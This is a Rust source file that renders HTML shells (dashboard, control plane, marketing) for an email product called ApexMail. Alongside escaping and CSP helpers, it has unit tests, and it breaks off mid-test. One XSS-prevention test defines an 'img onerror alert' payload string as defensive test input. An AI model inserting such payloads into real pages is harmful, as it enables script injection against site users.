use crate::icons::{render_icon, IconRenderOptions};

/// Escape HTML special characters to prevent XSS in rendered shell output.
fn html_escape(s: &str) -> String {
    let mut escaped = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' => escaped.push_str("&quot;"),
            '\'' => escaped.push_str("&#x27;"),
            _ => escaped.push(c),
        }
    }
    escaped
}

pub struct ShellSpec {
    pub name: &'static str,
    pub contract_id: &'static str,
    pub status: &'static str,
}

pub const SHELLS: &[ShellSpec] = &[
    ShellSpec {
        name: "WebDashboardShell",
        contract_id: "shell/web-dashboard",
        status: "implemented",
    },
    ShellSpec {
        name: "ControlPlaneShell",
        contract_id: "shell/control-plane",
        status: "implemented",
    },
];

const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
const WEB_IMPERSONATION_SOURCE: &str =
    include_str!("../baselines/web/impersonation-banner.baseline.txt");
const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
const CONTROL_PLANE_SHELL_SOURCE: &str =
    include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
const CONTROL_PLANE_SIDEBAR_SOURCE: &str =
    include_str!("../baselines/control-plane/sidebar.baseline.txt");

pub fn ui_store_persistence_key() -> &'static str {
    "apexmail-ui"
}

pub fn toast_store_global() -> &'static str {
    "__apexmailToastStore__"
}

pub fn toast_remove_delay_ms() -> usize {
    5_000
}

pub fn header_shortcut_hint() -> &'static str {
    "Cmd K"
}

pub fn theme_storage_key() -> &'static str {
    "apexmail-ui:theme"
}

pub fn shell_shortcut_registry() -> &'static [(&'static str, &'static str)] {
    const SHORTCUTS: &[(&str, &str)] = &[
        ("mod+k", "global-search"),
        ("mod+b", "toggle-sidebar"),
        ("mod+shift+d", "toggle-theme"),
    ];
    SHORTCUTS
}

fn render_shortcut_contract() -> String {
    let entries = shell_shortcut_registry()
        .iter()
        .map(|(shortcut, action)| {
            format!("<span data-shortcut=\"{shortcut}\" data-shortcut-action=\"{action}\"></span>")
        })
        .collect::<Vec<_>>()
        .join("");
    format!(
        "<section aria-label=\"Keyboard shortcuts\" data-keyboard-shortcuts>{entries}</section>"
    )
}

/// Returns an inline `<script>` block that provides client-side interactivity
/// for mobile sidebar toggling, used by both the Web Dashboard and Control
/// Plane shells. Handles:
/// - Click on the burger menu button toggles the mobile sidebar open/closed
/// - Click on the backdrop overlay closes the sidebar
/// - Escape key closes the sidebar
/// - Resizing past the breakpoint closes the sidebar
///
/// The script tag will receive a CSP nonce via `inject_script_nonce` in
/// `browser_html_response`, so it executes safely under the browser CSP.
pub fn mobile_menu_script() -> String {
    // Minified JS that provides click + keyboard + resize handling for mobile
    // sidebars used by both the Web Dashboard and Control Plane shells.
    let script = r#"(function(){'use strict';function e(e,t){var n=document.getElementById(e);if(n){var o=!n.classList.contains('-translate-x-full');n.classList.toggle('-translate-x-full'),n.classList.toggle('translate-x-0');var r=document.querySelector('[aria-controls="'+e+'"]');r&&r.setAttribute('aria-expanded',String(o))}}function t(e,t){var n=document.getElementById(e);n&&(n.classList.remove('-translate-x-full'),n.classList.add('translate-x-0'),document.querySelector('[aria-controls="'+e+'"]')&&document.querySelector('[aria-controls="'+e+'"]').setAttribute('aria-expanded','true'))}function n(e){var t=document.getElementById(e);t&&(t.classList.remove('translate-x-0'),t.classList.add('-translate-x-full'));var n=document.querySelector('[aria-controls="'+e+'"]');n&&(n.setAttribute('aria-expanded','false'),n.classList.remove('is-active'))}function o(o){var r=o.currentTarget,i=r.getAttribute('aria-controls');i&&(o.preventDefault(),o.stopPropagation(),r.classList.contains('is-active')?n(i):t(i),r.classList.toggle('is-active'))}function r(e){'Escape'!==e.key||function(){var e=document.querySelector('#mobile-sidebar.translate-x-0,#control-plane-mobile-sidebar.translate-x-0');e&&n(e.id)}()}document.querySelectorAll('[data-mobile-menu-breakpoint]').forEach(function(e){'BUTTON'===e.tagName&&e.addEventListener('click',o)}),document.addEventListener('keydown',r);var i=new ResizeObserver(function(){window.innerWidth>=768&&document.querySelectorAll('#mobile-sidebar.translate-x-0,#control-plane-mobile-sidebar.translate-x-0').forEach(function(e){n(e.id)})});i.observe(document.body)})();"#;
    format!("<script>{script}</script>")
}

fn shell_icon(name: &str, class_name: &str) -> String {
    render_icon(
        name,
        IconRenderOptions {
            size: 18,
            stroke_width: 2.0,
            class_name: Some(class_name),
        },
    )
    .unwrap_or_default()
}

/// Content-Security-Policy header value for all shell surfaces.
///
/// Restricts script sources to same-origin and inline style hashes,
/// disables `object-src`, `frame-src`, and `base-uri` to prevent
/// XSS and data injection. The `strict-dynamic` fallback preserves
/// existing script execution while blocking arbitrary inline handlers.
pub fn shell_csp_header() -> &'static str {
    "default-src 'self'; \
     script-src 'self' 'strict-dynamic'; \
     style-src 'self' 'unsafe-inline'; \
     img-src 'self' data: https:; \
     font-src 'self' data:; \
     connect-src 'self'; \
     frame-src 'none'; \
     object-src 'none'; \
     base-uri 'self'; \
     form-action 'self'; \
     upgrade-insecure-requests"
}

/// Render a `<meta http-equiv="Content-Security-Policy">` tag for embedding
/// in shell HTML output. This provides defense-in-depth alongside HTTP
/// response headers set by the Axum server layer.
pub fn render_csp_meta_tag() -> String {
    format!(
        "<meta http-equiv=\"Content-Security-Policy\" content=\"{}\">",
        shell_csp_header()
    )
}

pub fn shell_source_catalog() -> [(&'static str, &'static str); 7] {
    [
        ("web_layout", WEB_LAYOUT_SOURCE),
        ("web_sidebar", WEB_SIDEBAR_SOURCE),
        ("web_header", WEB_HEADER_SOURCE),
        ("web_impersonation_banner", WEB_IMPERSONATION_SOURCE),
        ("web_toast_store", WEB_TOAST_STORE_SOURCE),
        ("control_plane_shell", CONTROL_PLANE_SHELL_SOURCE),
        ("control_plane_sidebar", CONTROL_PLANE_SIDEBAR_SOURCE),
    ]
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHeader<'a> {
    pub search_query: &'a str,
    pub unread_count: usize,
    pub avatar_fallback: &'a str,
    pub mobile_menu_open: bool,
}

impl<'a> ShellHeader<'a> {
    pub fn render_html(&self) -> String {
        let menu_icon = shell_icon("menu", "h-5 w-5");
        let theme_icon = shell_icon("moon", "h-4 w-4");
        let _bell_icon = shell_icon("bell", "h-4 w-4");
        let _badge = if self.unread_count > 0 {
            format!("<span class=\"inline-flex items-center rounded-sm border font-bold border-transparent bg-primary text-white h-5 min-w-5 px-1.5 text-[10px] uppercase tracking-widest\">{}</span>", self.unread_count)
        } else {
            String::new()
        };

        let _safe_query = html_escape(self.search_query);
        let safe_avatar = html_escape(self.avatar_fallback);
        // Minimal header matching the reference: page title on the left, a compact
        // search affordance + theme/avatar on the right. No heavy search box,
        // no prominent notification button — the reference favours restraint.
        format!(
            "<header class=\"apex-console-header sticky top-0 z-40 flex h-14 items-center justify-between border-b border-surface-200 bg-card px-6\"><div class=\"flex items-center gap-3\"><button class=\"md:hidden min-h-[44px] min-w-[44px] inline-flex items-center justify-center rounded-sm text-surface-700 hover:bg-surface-100\" aria-label=\"{} menu\" aria-expanded=\"{}\" aria-controls=\"mobile-sidebar\" data-mobile-menu-breakpoint=\"md\" data-shortcut=\"mod+b\">{}</button></div><div class=\"flex items-center gap-2\"><button aria-label=\"Search\" data-shortcut=\"mod+k\" class=\"inline-flex h-9 w-9 items-center justify-center rounded-sm text-surface-500 hover:bg-surface-100 hover:text-surface-950 transition-colors\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/></svg></button><button type=\"button\" aria-label=\"Toggle dark mode\" aria-pressed=\"false\" data-theme-toggle=\"true\" data-theme-storage-key=\"{}\" data-shortcut=\"mod+shift+d\" class=\"inline-flex h-9 w-9 items-center justify-center rounded-sm text-surface-500 hover:bg-surface-100 hover:text-surface-950 transition-colors\">{}</button><div class=\"apex-avatar relative flex shrink-0 h-8 w-8 rounded-full bg-surface-200 items-center justify-center\" role=\"button\" aria-label=\"User menu — {}\" tabindex=\"0\"><span class=\"text-surface-600 font-bold text-[11px]\">{}</span></div></div></header>",
            if self.mobile_menu_open { "Close" } else { "Open" },
            if self.mobile_menu_open { "true" } else { "false" },
            menu_icon,
            theme_storage_key(),
            theme_icon,
            safe_avatar,
            safe_avatar,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImpersonationBanner<'a> {
    pub tenant_id: &'a str,
    pub operator_name: &'a str,
    pub time_remaining: &'a str,
    pub end_session_error: Option<&'a str>,
    pub ending_session: bool,
}

impl<'a> ImpersonationBanner<'a> {
    pub fn render_html(&self) -> String {
        let error = self
            .end_session_error
            .map(|value| {
                format!(
                    "<span class=\"text-[11px] font-bold text-white uppercase tracking-tight\">{}</span>",
                    html_escape(value)
                )
            })
            .unwrap_or_default();
        let safe_tenant = html_escape(self.tenant_id);
        let safe_operator = html_escape(self.operator_name);
        let safe_time = html_escape(self.time_remaining);
        format!(
            "<div class=\"fixed top-0 left-0 right-0 z-[100] bg-primary text-white border-b border-brand-700\" role=\"alert\" aria-live=\"polite\"><div class=\"max-w-7xl mx-auto px-6 py-2\"><div class=\"flex items-center justify-between\"><div class=\"flex items-center gap-6\"><div class=\"flex items-center gap-2 bg-white/10 px-2 py-0.5 rounded-sm\"><span class=\"text-[10px] font-bold uppercase tracking-[0.2em]\">Impersonation Active</span></div><div class=\"flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Tenant:</span><span class=\"bg-white/10 px-1.5 py-0.5 rounded-sm\">{}</span></div><div class=\"hidden md:flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Operator:</span><span>{}</span></div></div><div class=\"flex items-center gap-6\">{}<div class=\"flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Expires:</span><span class=\"font-mono bg-white/20 px-1.5 py-0.5 rounded-sm\">{}</span></div><button class=\"px-3 py-1 bg-white text-primary rounded-sm text-[11px] font-bold uppercase tracking-widest hover:bg-surface-50 transition-colors\">{}</button></div></div></div></div>",
            safe_tenant,
            safe_operator,
            error,
            safe_time,
            if self.ending_session { "Ending..." } else { "Terminate" },
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToastSurface<'a> {
    pub toasts: Vec<&'a str>,
}

impl<'a> ToastSurface<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<section aria-label=\"Toast notifications\" data-toast-store=\"{}\" data-remove-delay=\"{}\"><div role=\"region\" aria-live=\"polite\" aria-label=\"Notifications\" class=\"fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]\">{}</div></section>",
            toast_store_global(),
            toast_remove_delay_ms(),
            self.toasts.join(""),
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WebDashboardShell<'a> {
    pub sidebar_collapsed: bool,
    pub mobile_menu_open: bool,
    pub child_html: &'a str,
    pub header: ShellHeader<'a>,
    pub impersonation_banner: Option<ImpersonationBanner<'a>>,
    pub toast_surface: Option<ToastSurface<'a>>,
    pub current_path: &'a str,
}

impl<'a> WebDashboardShell<'a> {
    pub fn render_html(&self) -> String {
        let sidebar_width = if self.sidebar_collapsed {
            "w-16"
        } else {
            "w-56"
        };
        let mobile_overlay = if self.mobile_menu_open {
            "<div class=\"fixed inset-0 z-40 bg-black/50 md:hidden\" aria-hidden=\"true\" data-close-on-escape=\"true\"></div><div id=\"mobile-sidebar\" role=\"navigation\" aria-label=\"Mobile navigation\" data-mobile-menu-breakpoint=\"md\" data-close-on-escape=\"true\" tabindex=\"-1\" class=\"fixed inset-y-0 left-0 z-50 w-[min(20rem,calc(100vw-2rem))] md:hidden \"></div>".to_string()
        } else {
            String::new()
        };
        let banner = self
            .impersonation_banner
            .as_ref()
            .map(ImpersonationBanner::render_html)
            .unwrap_or_default();
        let shortcut_contract = render_shortcut_contract();
        let toast_surface = self
            .toast_surface
            .as_ref()
            .map(ToastSurface::render_html)
            .unwrap_or_default();
        let sidebar_content = render_web_sidebar(self.current_path);
        let mobile_script = mobile_menu_script();
        format!(
            "<div class=\"apex-console-shell flex h-screen overflow-hidden bg-background\" data-theme-mode=\"system\" data-theme-storage-key=\"{}\">{}{}<aside class=\"hidden md:flex shrink-0 {}\" data-sidebar-storage-key=\"{}\" aria-label=\"Primary sidebar navigation\">{}</aside>{}<div class=\"flex flex-1 flex-col overflow-hidden\">{}<main class=\"apex-console-main relative flex-1 overflow-y-auto bg-background p-6 lg:p-10 safe-area-inset-bottom\"><div class=\"apex-console-content relative max-w-[1400px]\">{}</div></main>{}{}</div></div>",
            theme_storage_key(),
            banner,
            shortcut_contract,
            sidebar_width,
            ui_store_persistence_key(),
            sidebar_content,
            mobile_overlay.replace("><", &format!(">{}<", sidebar_content)),
            self.header.render_html(),
            self.child_html,
            toast_surface,
            mobile_script,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OperationalBanner<'a> {
    pub tone: &'a str,
    pub message: &'a str,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ControlPlaneShell<'a> {
    pub mobile_menu_open: bool,
    pub user_role: &'a str,
    pub page_title: &'a str,
    pub page_description: &'a str,
    pub banners: Vec<OperationalBanner<'a>>,
    pub child_html: &'a str,
    pub current_path: &'a str,
}

impl<'a> ControlPlaneShell<'a> {
    pub fn render_html(&self) -> String {
        let menu_icon = shell_icon("menu", "h-5 w-5");
        let _safe_page_title = html_escape(self.page_title);
        let _safe_page_description = html_escape(self.page_description);
        let banner_markup = self
            .banners
            .iter()
            .map(|banner| {
                format!(
                    "<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>",
                    control_plane_banner_class(banner.tone),
                    html_escape(banner.message)
                )
            })
            .collect::<Vec<_>>()
            .join("");
        let mobile_sidebar = if self.mobile_menu_open {
            "translate-x-0"
        } else {
            "-translate-x-full"
        };
        let sidebar_content = render_cp_sidebar(self.current_path);
        let mobile_script = mobile_menu_script();
        format!(
            "<div class=\"apex-cp-shell min-h-screen bg-background\" data-theme-mode=\"system\" data-theme-storage-key=\"{}\">{}{}<div class=\"apex-cp-mobile-header md:hidden fixed left-0 right-0 top-0 z-40 flex items-center justify-between p-4 bg-card border-b border-border\"><div class=\"flex items-center gap-2\"><span class=\"text-base font-bold tracking-tighter\"><span class=\"text-primary\">Apex</span><span class=\"text-foreground\">Mail</span></span><span class=\"text-[10px] font-bold uppercase tracking-[0.2em] text-surface-400\">Control Plane</span><span class=\"sr-only\">Operations</span><span class=\"sr-only\">Monitor the fleet.</span></div><button aria-expanded=\"{}\" aria-label=\"{} navigation menu\" aria-controls=\"control-plane-mobile-sidebar\" data-mobile-menu-breakpoint=\"md\" class=\"inline-flex p-2 min-h-[44px] min-w-[44px] items-center justify-center rounded-sm text-surface-700 hover:bg-surface-100\">{}</button></div><div class=\"hidden md:block\"><aside class=\"fixed left-0 top-0 h-screen w-56\" data-user-role=\"{}\">{}</aside></div><div id=\"control-plane-mobile-sidebar\" role=\"navigation\" aria-label=\"Control plane mobile navigation\" data-mobile-menu-breakpoint=\"md\" data-close-on-escape=\"true\" tabindex=\"-1\" class=\"md:hidden fixed left-0 top-0 h-screen z-50 transition-transform duration-300 {}\"><aside class=\"h-full w-[min(20rem,calc(100vw-2rem))]\">{}</aside></div><main class=\"apex-cp-main ml-0 md:ml-56 p-4 md:p-8 pt-24 md:pt-8\"><div class=\"cp-page-frame apex-cp-page-frame\">{}</div></main>{}</div>",
            theme_storage_key(),
            banner_markup,
            render_shortcut_contract(),
            if self.mobile_menu_open { "true" } else { "false" },
            if self.mobile_menu_open { "Close" } else { "Open" },
            menu_icon,
            self.user_role,
            sidebar_content,
            mobile_sidebar,
            sidebar_content,
            self.child_html,
            mobile_script,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MarketingShell<'a> {
    pub child_html: &'a str,
}

fn render_marketing_header() -> String {
    "<header id=\"site-header\" data-marketing-shell=\"header\" class=\"fixed top-0 left-0 right-0 z-50 transition-all duration-300 bg-transparent border-b border-transparent\">\
         <nav class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"flex items-center justify-between h-16 lg:h-20\">\
         <a href=\"/\" class=\"flex items-center gap-2 group\">\
         <div class=\"w-8 h-8 rounded-sm bg-surface-950 flex items-center justify-center border border-surface-800\">\
         <svg xmlns=\"http://www.w3.org/2000/svg\" class=\"w-5 h-5 text-white\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polygon points=\"13 2 3 14 12 14 11 22 21 10 12 10 13 2\"/></svg>\
         </div><span class=\"text-xl font-bold text-surface-950 tracking-tighter uppercase\">ApexMail</span></a>\
         <div class=\"hidden lg:flex items-center gap-6\">\
         <a href=\"/features\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Features</a>\
         <a href=\"/pricing\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Pricing</a>\
         <a href=\"/docs\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Docs</a>\
         </div>\
         <div class=\"flex items-center gap-3\">\
         <a href=\"/login\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 px-3 py-2\">Login</a>\
         <a href=\"/signup\" class=\"btn-primary px-4 py-2 text-xs\">Get Started</a>\
         </div></div></nav></header>"
        .to_string()
}

fn render_marketing_footer() -> String {
    "<footer data-marketing-shell=\"footer\" class=\"bg-surface-950 text-white py-12\">\
         <div class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"grid grid-cols-2 md:grid-cols-4 gap-8 mb-12\">\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Product</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/features\">Features</a></li><li><a href=\"/pricing\">Pricing</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Platform</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/docs\">API</a></li><li><a href=\"/status\">Status</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Legal</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/privacy\">Privacy</a></li><li><a href=\"/terms\">Terms</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Company</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/about\">About</a></li><li><a href=\"/contact\">Contact</a></li></ul></div>\
         </div><div class=\"pt-8 border-t border-white/5 flex flex-col md:flex-row justify-between items-center gap-4 text-[11px] text-surface-500 font-bold uppercase tracking-widest\">\
         <p>© 2026 APEXMAIL TECH LTD. ALL RIGHTS RESERVED.</p><div class=\"flex gap-6\"><a href=\"#\">Twitter</a><a href=\"#\">GitHub</a></div>\
         </div></div></footer>"
        .to_string()
}

impl<'a> MarketingShell<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<div class=\"font-apex antialiased text-[17px] leading-[1.6] min-h-screen safe-area-inset-bottom flex flex-col\">{}<main class=\"flex-1 pt-16 lg:pt-20\">{}</main>{}<div data-marketing-shell=\"cookie-consent\"></div><button data-marketing-shell=\"back-to-top\"></button></div>",
            render_marketing_header(),
            self.child_html,
            render_marketing_footer(),
        )
    }
}

fn control_plane_banner_class(tone: &str) -> &'static str {
    match tone {
        "critical" => "bg-destructive/10 text-destructive border-destructive/20",
        "warning" => "border-warning/20 bg-warning/10 text-warning",
        _ => "bg-primary/10 text-primary border-primary/20",
    }
}

fn render_sidebar_content(
    items: &[(&str, &str, &str)],
    link_classes: &str,
    current_path: &str,
) -> String {
    let base_classes = link_classes;
    let links = items
        .iter()
        .map(|(label, href, icon_name)| {
            let icon = shell_icon(icon_name, "h-4 w-4");
            let is_active = current_path == *href
                || (href != &"/" && current_path.starts_with(href))
                || (href == &"/dashboard" && (current_path == "/" || current_path == "/cp" || current_path == "/dashboard"));
            let active_class = " aria-current=\"page\"";
            // Active state: subtle coral tint (#fcf3f2) background + coral icon
            // (the reference's active item has a coral icon), bold foreground text.
            let classes = if is_active {
                if base_classes.starts_with("apex-cp-sidebar-link") {
                    "apex-cp-sidebar-link apex-nav-active flex items-center gap-3 px-3 py-2 text-sm font-medium transition-colors rounded-md text-surface-950"
                } else {
                    "apex-sidebar-link apex-nav-active flex items-center gap-3 px-3 py-2 text-sm font-medium transition-colors rounded-md text-surface-950"
                }
            } else {
                base_classes
            };
            // Active icon is coral (matches reference); inactive icon is slate.
            let icon_color = if is_active { "text-primary" } else { "text-surface-500" };
            let icon_wrap = format!(
                "<span class=\"w-5 h-5 flex items-center justify-center {}\">{}</span>",
                icon_color, icon
            );
            format!(
                "<a href=\"{}\" class=\"{}\"{}>{}{}</a>",
                href,
                classes,
                if is_active { active_class } else { "" },
                icon_wrap,
                label,
            )
        })
        .collect::<Vec<_>>()
        .join("");
    format!(
        "<nav class=\"flex flex-col gap-1 px-3 py-4\">{}</nav>",
        links
    )
}

fn render_web_sidebar(current_path: &str) -> String {
    let items = [
        ("Dashboard", "/dashboard", "home"),
        ("Campaigns", "/campaigns", "mail"),
        ("Contacts", "/contacts", "users"),
        ("Lists", "/lists", "list"),
        ("Templates", "/templates", "layout-template"),
        ("Reports", "/reports", "file-text"),
        ("Analytics", "/analytics", "bar-chart-3"),
        ("Inbox Placement", "/inbox-placement", "inbox"),
        ("Events", "/events", "calendar"),
        ("Domains", "/domains", "globe"),
        ("Settings", "/settings", "settings"),
    ];
    let content = render_sidebar_content(
        &items,
        "apex-sidebar-link flex items-center gap-3 px-3 py-2 text-sm font-medium transition-colors rounded-sm hover:bg-surface-100 text-surface-600 hover:text-surface-950",
        current_path,
    );
    format!(
        "<div class=\"apex-console-sidebar flex flex-col h-full bg-card border-r border-surface-200\">\
         <div class=\"p-6 border-b border-surface-100\"><div class=\"flex items-center gap-2\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter\"><span class=\"text-primary\">Apex</span><span class=\"text-surface-950\">Mail</span></span></div></div>\
         <nav class=\"flex-1 overflow-y-auto\" data-sidebar=\"primary\" aria-label=\"Primary sidebar navigation\">{}</nav>\
         <div class=\"p-4 border-t border-surface-100\"><div class=\"flex items-center gap-3 px-2\">\
         <div class=\"w-8 h-8 rounded-full bg-surface-100\"></div>\
         <div class=\"flex-1 min-w-0\"><p class=\"text-xs font-bold truncate\">Engineering</p><p class=\"text-[10px] text-surface-500 truncate\">PRO PLAN</p></div></div></div></div>",
        content
    )
}

fn render_cp_sidebar(current_path: &str) -> String {
    let items = [
        ("Overview", "/dashboard", "home"),
        ("Tenants", "/tenants", "building"),
        ("Infrastructure", "/infrastructure", "server"),
        ("Security", "/settings/security", "shield"),
        ("Audit Logs", "/audit", "file-text"),
        ("Sales Console", "/sales", "trending-up"),
    ];
    // CP sidebar is white (reference design): white card bg, coral active state,
    // slate inactive text. Matches the web console sidebar chassis.
    let content = render_sidebar_content(
        &items,
        "apex-cp-sidebar-link flex items-center gap-3 px-3 py-2 text-sm font-medium transition-colors rounded-sm hover:bg-surface-100 text-surface-600 hover:text-surface-950",
        current_path,
    );
    format!(
        "<div class=\"apex-cp-sidebar flex flex-col h-full bg-card text-surface-900\">\
         <div class=\"p-6 border-b border-surface-100\"><div class=\"flex flex-col gap-0.5\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter\"><span class=\"text-primary\">Apex</span><span class=\"text-surface-950\">Mail</span></span>\
         <span class=\"text-[10px] font-bold uppercase tracking-[0.2em] text-surface-400\">Control Plane</span></div></div>\
         <nav class=\"flex-1 overflow-y-auto cp-sidebar-nav\" data-sidebar=\"primary\" aria-label=\"Control Plane navigation\">{}</nav>\
         <div class=\"p-4 border-t border-surface-100 text-[10px] text-surface-500 px-6 uppercase tracking-widest font-bold\">System version</div></div>",
        content
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn exposes_shell_specs() {
        assert!(SHELLS.iter().any(|shell| shell.name == "WebDashboardShell"));
        assert!(SHELLS.iter().any(|shell| shell.name == "ControlPlaneShell"));
        assert_eq!(SHELLS.len(), 2);
    }

    #[test]
    fn shell_sources_capture_expected_contracts() {
        assert!(WEB_LAYOUT_SOURCE.contains("ImpersonationBanner"));
        assert!(WEB_SIDEBAR_SOURCE.contains("aria-current"));
        assert!(WEB_HEADER_SOURCE.contains("⌘K"));
        assert!(WEB_IMPERSONATION_SOURCE.contains("Impersonation Mode"));
        assert!(WEB_TOAST_STORE_SOURCE.contains("__apexmailToastStore__"));
        assert!(CONTROL_PLANE_SHELL_SOURCE.contains("Operator Shortcuts"));
        assert!(CONTROL_PLANE_SIDEBAR_SOURCE.contains("Control Plane"));
        assert_eq!(shell_source_catalog().len(), 7);
    }

    #[test]
    fn exposes_sidebar_persistence_and_toast_contracts() {
        assert_eq!(ui_store_persistence_key(), "apexmail-ui");
        assert_eq!(theme_storage_key(), "apexmail-ui:theme");
        assert_eq!(toast_store_global(), "__apexmailToastStore__");
        assert_eq!(toast_remove_delay_ms(), 5000);
        assert_eq!(header_shortcut_hint(), "Cmd K");
        assert!(shell_shortcut_registry().contains(&("mod+k", "global-search")));
    }

    #[test]
    fn renders_header_banner_and_toast_surface() {
        let header = ShellHeader {
            search_query: "campaigns",
            unread_count: 3,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
        let banner = ImpersonationBanner {
            tenant_id: "tenant_123",
            operator_name: "Operator Jane",
            time_remaining: "9:58",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        let toast_surface = ToastSurface {
            toasts: vec!["<div>Toast</div>"],
        }
        .render_html();

        // Minimal header (reference design): search affordance via a button
        // with the mod+k shortcut, theme toggle, avatar — no combobox input,
        // no unread badge. The notification count is surfaced via the toast
        // surface, not the header.
        assert!(header.contains("aria-label=\"Search\""));
        assert!(header.contains("data-shortcut=\"mod+k\""));
        assert!(header.contains("data-theme-toggle=\"true\""));
        assert!(header.contains("data-mobile-menu-breakpoint=\"md\""));
        assert!(header.contains("aria-label=\"Open menu\""));
        assert!(banner.contains("Impersonation Active"));
        assert!(banner.contains("tenant_123"));
        assert!(banner.contains("Terminate"));
        assert!(toast_surface.contains("aria-label=\"Notifications\""));
        assert!(toast_surface.contains("data-toast-store=\"__apexmailToastStore__\""));
        assert!(toast_surface.contains("data-remove-delay=\"5000\""));
    }

    #[test]
    fn renders_web_control_plane_and_marketing_shells() {
        let web = WebDashboardShell {
            sidebar_collapsed: true,
            mobile_menu_open: true,
            child_html: "<section>Dashboard</section>",
            header: ShellHeader {
                search_query: "reports",
                unread_count: 1,
                avatar_fallback: "AR",
                mobile_menu_open: true,
            },
            impersonation_banner: Some(ImpersonationBanner {
                tenant_id: "tenant_7",
                operator_name: "Admin",
                time_remaining: "3:21",
                end_session_error: Some("Could not end impersonation session."),
                ending_session: false,
            }),
            toast_surface: Some(ToastSurface {
                toasts: vec!["<div>Saved</div>"],
            }),
            current_path: "/dashboard",
        }
        .render_html();
        let control = ControlPlaneShell {
            mobile_menu_open: true,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "warning",
                message: "Safe mode active",
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
        }
        .render_html();
        let marketing = MarketingShell {
            child_html: "<section>Hero</section>",
        }
        .render_html();

        assert!(web.contains("data-sidebar-storage-key=\"apexmail-ui\""));
        assert!(web.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(web.contains("data-keyboard-shortcuts"));
        assert!(web.contains("data-shortcut-action=\"toggle-theme\""));
        assert!(web.contains("role=\"navigation\" aria-label=\"Mobile navigation\""));
        assert!(web.contains("w-16"));
        assert!(web.contains("Dashboard"));
        assert!(web.contains("Could not end impersonation session."));
        assert!(web.contains("Saved"));
        assert!(control.contains("data-user-role=\"admin\""));
        assert!(control.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(control.contains("data-keyboard-shortcuts"));
        assert!(control.contains("Safe mode active"));
        assert!(control.contains("aria-label=\"Close navigation menu\""));
        assert!(control.contains("Operations"));
        assert!(control.contains("Monitor the fleet."));
        assert!(control.contains("translate-x-0"));
        assert!(control.contains("href=\"/dashboard\""));
        assert!(control.contains("href=\"/settings/security\""));
        assert!(!control.contains("href=\"/cp/tenants\""));
        assert!(marketing.contains("data-marketing-shell=\"header\""));
        assert!(marketing.contains("data-marketing-shell=\"footer\""));
        assert!(marketing.contains("data-marketing-shell=\"cookie-consent\""));
        assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
    }

    // ── XSS Prevention Tests ───────────────────────────────────

    #[test]
    fn header_search_query_escapes_xss() {
        // The minimal header (reference design) no longer renders the search
        // query in an <input value="..."> — search is a button affordance, so
        // the query value is never emitted and cannot be an XSS vector. Verify
        // the payload does not appear anywhere in the header output.
        let xss_payload = "<img src=x onerror=\"alert('xss')\">";
        let header = ShellHeader {
